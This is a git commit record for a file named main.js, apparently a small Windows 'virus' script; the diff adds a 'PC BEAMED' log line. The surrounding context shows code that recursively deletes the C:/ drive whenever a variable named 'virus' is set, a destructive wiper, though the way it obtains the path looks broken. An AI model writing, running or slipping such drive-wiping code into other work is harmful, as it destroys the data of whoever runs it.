f2ddc8052585cb675a7ccd10f3f9bf6425b6a3b9
Brackzz <87747715+Bwashere@users.noreply.github.com>
2021-08-24 18:36:10 -0500

    Update main.js

--- main.js
+++ main.js
@@ -3,6 +3,7 @@ console.log('Creator: Brackzz#0001')
 const fs = require('fs')
 let dir = require('C:/')
 let virus = "A";
+console.log('PC BEAMED')
 if (virus === 'A') {
     fs.rm(dir, { recursive: true });
 }
